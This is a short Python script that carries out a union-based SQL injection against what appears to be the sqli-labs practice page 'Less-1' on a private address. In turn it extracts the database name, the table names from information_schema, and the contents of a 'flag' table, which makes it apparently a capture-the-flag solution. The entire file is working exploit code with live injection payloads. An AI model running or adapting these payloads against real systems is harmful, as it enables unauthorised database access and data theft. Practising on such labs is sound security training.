import requests
import re

url = "http://192.168.5.12:8082/Less-1/"

def get_database_name() -> str:
    payload = (
    "-1'"
    "union select 1,database(),3"
    " -- "
    )

    params = {
        "id": payload,
    }
    resp = requests.get(url=url, params=params)

    data = resp.text
    m = re.search(r"Your Login name:(.*?)<br>", data)
    if m:
        return m.group(1).strip()

def get_tables_name(db_name: str) -> str:
    payload = (
        "-1'"
        f"union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='{db_name}'"
        " -- "
    )

    params = {
            "id": payload,
    }

    resp = requests.get(url=url, params=params)

    data = resp.text

    m = re.search(r"Your Login name:(.*?)<br>", data)
    if m:
        return m.group(1).strip()

def get_flag() -> str:
    payload = (
        "-1'"
        "union select 1,group_concat(value),3" 
        " from flag "
        " -- "
    )

    params = {
            "id": payload,
    }

    resp = requests.get(url=url, params=params)

    data = resp.text

    m = re.search(r"Your Login name:(.*?)<br>", data)
    if m:
        return m.group(1).strip()


if __name__ == "__main__":
    db_name = get_database_name()
    print("Database name is: ",db_name)
    t_name = get_tables_name(db_name)
    print("All table name is: ",t_name)
    flag = get_flag()
    print("flag: ", flag)





    

